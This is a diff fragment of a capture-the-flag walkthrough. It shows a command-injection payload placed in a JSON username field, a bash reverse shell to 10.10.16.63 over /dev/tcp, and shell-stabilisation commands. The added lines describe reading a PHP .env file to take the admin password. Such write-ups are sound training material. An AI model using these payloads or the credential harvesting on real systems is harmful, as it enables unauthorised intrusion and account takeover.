@@ -32,4 +32,6 @@
 - we go to generate vpn with admin and yes it has command inj **{"username":"kafafy ; id #"}** using this payload we got the id command
 - we try to get shell on the machine using bash reverse shell  **{"username":"kafafy ; bash -c 'bash -i >& /dev/tcp/10.10.16.63/1234 0>&1' #"}**
 - we stablize the shell using --> **python3 -c 'import pty:pty.spawn("/bin/bash")'** --> **stty raw -echo;fg** --> **export TERM=xterm**
--   
+- .env is a file is commonly used in PHP applications to store environment variable values
+- we cat the file and we got admin password we su to admin and we go the home directory to get the user.txt
+# now ROOT SHELL
